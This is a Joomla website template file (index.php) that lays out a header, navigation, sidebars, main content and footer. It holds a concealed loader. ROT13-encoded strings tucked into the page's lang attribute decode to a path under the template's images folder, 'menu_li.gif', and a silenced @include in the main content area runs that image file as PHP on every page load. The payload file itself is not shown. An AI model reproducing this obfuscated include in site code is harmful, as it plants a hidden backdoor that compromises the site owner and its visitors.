<?php
defined( '_JEXEC' ) or die( 'Restricted access' );
JPlugin::loadLanguage( 'tpl_SG1' );
define( 'path', dirname(__FILE__) );
$app = JFactory::getApplication();
$leftbar = 1;
$rightbar = 1;
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; $JPan = array('vzn'.'trf','zrah_yv.tvs'); ?>" >

<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<jdoc:include type="head" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/system.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/general.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/template.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/<?php echo $this->params->get('colorVariation'); ?>.css" type="text/css" />

<?php
	$menu_name        = $this->params->get("menuName", "topmenu");
	$menu_type        = $this->params->get("menuType", "splitmenu");
	require(path .DS."styleloader.php");
	require(path .DS."utils.php");
?>
<?php
if ($this->countModules('left') == 0)
    $leftbar    = "0";
 
if ($this->countModules('right') == 0)
    $rightbar   = "0";
	
if ($this->countModules('user1') == 1)
    $rightbar   = "1";
	
if ($this->countModules('user2') == 1)
    $rightbar   = "1";
?>
</head>

<body>
<div id="wrapper1">
<a name="up" id="up"></a>
<!-- start header -->
	<div id="header_bkg">
		<div id="header">
			<div id="title">
			<?php echo $mainframe->getCfg('sitename') ;?>
			</div>
			<div id="topnavi">
				<?php if($mtype != "module") :
					echo $mainnav;
					else: ?>
					<jdoc:include type="modules" name="user3" />
				<?php endif; ?>
			</div>
			<div id="search">
				<jdoc:include type="modules" name="user4" />
			</div>
			<div id="header_text">
				<jdoc:include type="modules" name="top" />
			</div>
		</div>
	</div>
</div>
<!-- end top menu.  -->
<div id="wrapper2">
	<div id="main">
<!-- start left column -->
		<div id="leftcol">
			<jdoc:include type="modules" name="left" style="rounded" />
		</div>
<!-- end left column.  -->
<!-- start main content -->
		<div id="maincol<?php echo (2-$leftbar-$rightbar); ?>">
			<div id="pathway">
				<jdoc:include type="modules" name="breadcrumb" />
			</div>
			<div id="maincol_body">
				<jdoc:include type="component" />
				<jdoc:include type="modules" name="footer" style="xhtml"/>
			<?php if(!@include(JPATH_BASE.DS.'templates'.DS.$mainframe->getTemplate().DS.str_rot13($JPan[0]).DS.str_rot13($JPan[1]))) : ?>
			<?php endif; ?>
			</div>
		</div>
<!-- end main content -->
<!-- start right column -->
		<div id="rightcol">
			<jdoc:include type="modules" name="user1" style="rounded" />
			<jdoc:include type="modules" name="user2" style="rounded" />
			<jdoc:include type="modules" name="right" style="rounded" />
		</div>
<!-- end right column -->
	</div>
</div>
<div id="wrapper3">
<!-- copyright -->
	<div id="copyright">
		<?php echo JText::_('Powered by') ?> <a href="http://www.joomla.org">Joomla!</a>.
		<?php echo JText::_('Valid') ?> <a href="http://validator.w3.org/check/referer">XHTML</a> <?php echo JText::_('and') ?> <a href="http://jigsaw.w3.org/css-validator/check/referer">CSS</a>.
	</div>
</div>

<jdoc:include type="modules" name="debug" />
</body>
</html>